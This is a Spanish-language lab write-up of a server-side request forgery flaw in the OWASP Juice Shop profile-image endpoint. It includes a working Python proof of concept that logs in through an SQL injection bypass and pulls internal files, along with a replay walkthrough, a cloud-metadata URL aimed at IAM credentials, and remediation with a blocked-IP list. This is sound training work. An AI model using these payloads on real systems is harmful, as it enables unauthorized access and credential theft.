<div align="center">

# 📡 SSRF — Imagen de Perfil
### OWASP Juice Shop · Server-Side Request Forgery

![Status](https://img.shields.io/badge/Status-Verificado-00ff88?style=for-the-badge&logo=statuspage&logoColor=white)
![Severity](https://img.shields.io/badge/Severidad-Alta-ff6b00?style=for-the-badge)
![Type](https://img.shields.io/badge/Tipo-SSRF-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)

</div>

---

> **Hallazgo:** el endpoint `POST /profile/image/url` acepta una URL arbitraria como `imageUrl`, el servidor realiza un fetch hacia esa URL y guarda el contenido como imagen de perfil. Acepta URLs internas (`http://localhost:3000/...`), permitiendo enumeración y lectura de recursos internos de la aplicación.

> [!WARNING]
> Uso exclusivo en laboratorio controlado (`http://localhost:3000`). No reproducir en sistemas sin autorización explícita.

---

## 📋 Resumen del Hallazgo

| Campo | Detalle |
|-------|---------|
| **Aplicación** | OWASP Juice Shop |
| **Endpoint** | `POST /profile/image/url` |
| **Parámetro** | `imageUrl` (form body) |
| **Tipo** | Server-Side Request Forgery (SSRF) |
| **Severidad** | 🟠 Alta |
| **CVSS v3** | 7.5 · AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N |
| **Autenticación** | Sí (cookie `token`) |
| **Estado** | ✅ Verificado |

---

## 🔍 Descripción

La funcionalidad de cambio de foto de perfil permite ingresar una URL externa que el servidor descargará y guardará como imagen. El parámetro `imageUrl` no valida el destino de la URL, aceptando hosts internos como `localhost` y `127.0.0.1`. El servidor actúa como proxy involuntario, haciendo fetch de recursos internos en nombre del atacante y guardando el contenido en `/assets/public/images/uploads/`.

> [!NOTE]
> El contenido guardado no se valida como imagen real. Recursos de texto, JSON, o archivos arbitrarios son aceptados y recuperables vía GET a la ruta de imagen asignada.

---

## 🔬 Análisis Técnico

### `[01]` Formulario detectado en `/profile`

```html
<form action="./profile/image/url" method="post">
  <input id="url" type="text" name="imageUrl">
</form>
```

### `[02]` Flujo de la vulnerabilidad

```
Atacante → POST /profile/image/url
           imageUrl = http://localhost:3000/ftp/secret.bak
                              │
                              ▼
                   Servidor hace fetch interno
                              │
                              ▼
                   Guarda contenido en /assets/public/images/uploads/<id>.jpg
                              │
                              ▼
Atacante → GET /assets/public/images/uploads/<id>.jpg
           Recupera contenido del recurso interno
```

---

## 🧪 Reproducción

### `[01]` PoC — Python

```python
python3 - <<'PY'
import requests, re

base = 'http://localhost:3000'

# 1. Autenticar (via SQLi)
auth = requests.post(
    base + '/rest/user/login',
    json={'email': "' or 1=1--", 'password': 'x'}
).json()['authentication']

cookies = {'token': auth['token']}

# 2. Enviar URL interna como imageUrl
r = requests.post(
    base + '/profile/image/url',
    cookies=cookies,
    data={'imageUrl': 'http://localhost:3000/ftp/quarantine/juicy_malware_linux_amd_64.url'},
    allow_redirects=False
)
print('POST status:', r.status_code, r.headers.get('Location'))

# 3. Obtener path de imagen guardada
html = requests.get(base + '/profile', cookies=cookies).text
src  = re.search(r'<img class="img-rounded" src="([^"]+)"', html).group(1)
print('Imagen guardada en:', src)

# 4. Recuperar contenido del recurso interno
fetched = requests.get(base + src)
print('Tipo:', fetched.headers.get('Content-Type'))
print('Primeros 200 bytes:', fetched.content[:200])
PY
```

### `[02]` Resultado observado

```
POST status: 302 /profile
Imagen guardada en: /assets/public/images/uploads/1.jpg
Tipo: image/jpeg
Primeros 200 bytes:
[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,11
[InternetShortcut]
URL=https://github.com/juice-shop/juicy-malware/raw/master/...
```

- Servidor aceptó URL interna loopback
- Contenido no-imagen guardado sin validación de tipo
- Recurso interno accesible via GET al path de imagen

---

## 🌐 Otros Targets Verificados

| URL interna | Resultado |
|-------------|-----------|
| `http://localhost:3000/ftp/legal.md` | ✅ Aceptado — contenido MD guardado |
| `http://localhost:3000/rest/admin/application-version` | ✅ Aceptado — JSON con versión |
| `http://localhost:3000/ftp/quarantine/juicy_malware_linux_amd_64.url` | ✅ Aceptado — shortcut de archivo |

---

## 🔁 Flujo con Caido

1. Capturar `POST /profile/image/url` en `HTTP History`
2. `Send to Replay`
3. Cambiar `imageUrl` por recurso interno (`http://localhost:3000/ftp/...`)
4. Reenviar y observar status `302`
5. Recargar `/profile` — ver nuevo `src` de imagen
6. GET al nuevo `src` para recuperar contenido del recurso interno

---

## 💥 Impacto

- **Enumeración de recursos internos**: lectura de endpoints `/ftp/`, `/rest/admin/`, configuraciones
- **Bypass de controles de red**: el servidor actúa como proxy hacia su propia red interna
- **Exfiltración de datos**: contenido de archivos internos recuperable por el atacante
- **Pivot en cloud**: en entornos cloud, acceso potencial a endpoints de metadata (AWS IMDSv1, GCP metadata)
- **Confusión de tipo**: servidor no valida que el contenido sea imagen real

> [!IMPORTANT]
> En un entorno de producción cloud, `imageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/` podría exponer credenciales IAM de AWS.

---

## 🔧 Remediación

| Medida | Descripción |
|--------|-------------|
| **Whitelist de dominios** | Permitir solo dominios externos explícitamente autorizados |
| **Bloquear loopback** | Rechazar URLs que resuelvan a `127.0.0.1`, `localhost`, `169.254.x.x` |
| **Validar contenido descargado** | Verificar que el contenido sea imagen válida (magic bytes) antes de guardar |
| **Separar red interna** | El proceso que hace fetch no debe tener acceso a servicios internos |
| **DNS rebinding protection** | Resolver DNS y validar IP antes de hacer el fetch |

```javascript
// ✅ Ejemplo de validación básica
const { hostname } = new URL(imageUrl);
const resolved = await dns.resolve(hostname);
const blocked = ['127.0.0.1', '::1', '169.254.169.254'];
if (blocked.some(ip => resolved.includes(ip))) {
  throw new Error('URL interna no permitida');
}
```

---

## 🔗 Referencias

- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
